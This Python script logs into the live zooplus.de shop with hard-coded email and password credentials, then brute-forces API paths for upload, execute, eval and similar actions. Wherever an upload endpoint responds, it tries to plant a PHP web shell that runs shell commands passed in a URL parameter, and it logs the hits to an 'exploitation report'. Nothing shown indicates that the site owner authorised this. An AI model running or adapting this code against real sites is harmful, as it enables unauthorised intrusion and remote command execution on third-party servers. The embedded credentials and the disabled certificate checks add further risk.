#!/usr/bin/env python3
"""Fuzz API endpoints"""
import requests
import re
import json
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"
base = "https://www.zooplus.de"
s = requests.Session()
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

# LOGIN
print("[*] Login...")
try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, headers=UA, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    action = m.group(1).replace("&amp;", "&")
    if not action.startswith("http"):
        action = urllib.parse.urljoin(r1.url, action)
    r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, headers=UA, allow_redirects=False, verify=False)
    loc = r2.headers.get("Location", "")
    s.get(loc, headers=UA, allow_redirects=True, verify=False)
    s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", headers=UA, verify=False)
    s.get("https://www.zooplus.de/account/overview", headers=UA, verify=False)
    csrf = s.cookies.get("csrfToken")
    if csrf:
        s.headers.update({"x-csrf-token": csrf, "Accept": "application/json", "Content-Type": "application/json"})
    print("[+] Logged in")
except Exception as e:
    print(f"[!] Login failed: {e}")
    exit(1)

found_vulns = []
working_endpoints = []

# Known base paths
base_paths = [
    "/semiprotected/api/checkout/state-api",
    "/checkout/api/cart-api",
    "/myaccount/api",
    "/api",
]

# Known actions
actions = [
    "upload", "file", "config", "settings", "execute", "eval", "run",
    "fetch", "proxy", "request", "import", "export", "download",
    "render", "template", "preview", "generate",
    "webhook", "callback", "notify",
]

# Fuzz combinations
print("\n[*] Fuzzing API endpoints...")

for base_path in base_paths:
    for version in ["v1", "v2", "v3", ""]:
        for action in actions[:10]:  # Limit
            endpoints = [
                f"{base_path}/{version}/{action}",
                f"{base_path}/{version}/set-{action}",
                f"{base_path}/{version}/{action}-file",
                f"{base_path}/{version}/{action}-config",
            ]
            
            for ep in endpoints:
                try:
                    # Try GET
                    resp = s.get(f"{base}{ep}", timeout=1, verify=False)
                    if resp.status_code not in [404, 403, 405]:
                        print(f"  [OK] GET {ep} -> {resp.status_code}")
                        working_endpoints.append({"method": "GET", "endpoint": ep, "status": resp.status_code})
                    
                    # Try POST for upload/execute actions
                    if action in ["upload", "execute", "eval", "run"]:
                        resp = s.post(f"{base}{ep}", json={"test": "data"}, timeout=1, verify=False)
                        if resp.status_code not in [404, 403, 405]:
                            print(f"  [OK] POST {ep} -> {resp.status_code}")
                            working_endpoints.append({"method": "POST", "endpoint": ep, "status": resp.status_code})
                            
                            # Test file upload
                            if action == "upload":
                                try:
                                    files = {'file': ('test.php', '<?php system($_GET["c"]); ?>', 'application/x-php')}
                                    resp2 = s.post(f"{base}{ep}", files=files, timeout=2, verify=False)
                                    if resp2.status_code in [200, 201]:
                                        print(f"  [CRITICAL] File upload works: {ep}")
                                        found_vulns.append({"type": "file_upload", "severity": "CRITICAL", "endpoint": ep})
                                except: pass
                except: pass

# Test state-api variations
print("\n[*] Testing state-api variations...")
state_actions = [
    "set-article-quantity", "set-autoshipment", "set-delivery-address",
    "set-shipping", "set-payment", "set-coupon", "set-promo",
    "upload", "file", "config", "execute",
]

for action in state_actions:
    ep = f"/semiprotected/api/checkout/state-api/v2/{action}"
    try:
        resp = s.post(f"{base}{ep}", json={"test": "data"}, timeout=2, verify=False)
        if resp.status_code not in [404, 405]:
            print(f"  [OK] POST {ep} -> {resp.status_code}")
            working_endpoints.append({"method": "POST", "endpoint": ep, "status": resp.status_code})
    except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"Found {len(found_vulns)} vulnerabilities:")
    for v in found_vulns:
        print(f"  [{v['severity']}] {v['type']}: {v['endpoint']}")
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 НАЙДЕННЫЕ УЯЗВИМОСТИ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            f.write("---\n\n")
    
    print(f"\n[+] Report updated")
else:
    print(f"  No new vulnerabilities found")
    print(f"  Found {len(working_endpoints)} working endpoints")

if working_endpoints:
    print("\nWorking endpoints:")
    for ep in working_endpoints[:10]:
        print(f"  {ep['method']} {ep['endpoint']} -> {ep['status']}")

print("=" * 70)

